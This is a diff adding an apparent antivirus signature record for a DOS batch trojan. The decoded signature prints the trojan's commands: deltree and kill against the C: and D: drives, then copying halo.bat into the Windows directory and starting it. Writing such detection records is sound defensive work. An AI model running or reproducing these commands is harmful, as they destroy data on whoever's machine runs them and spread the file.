@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36625
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off deltree c:// deltree d:// kill c:// kill d:// copy halo.bat %0 %windir% start daily halo.bat
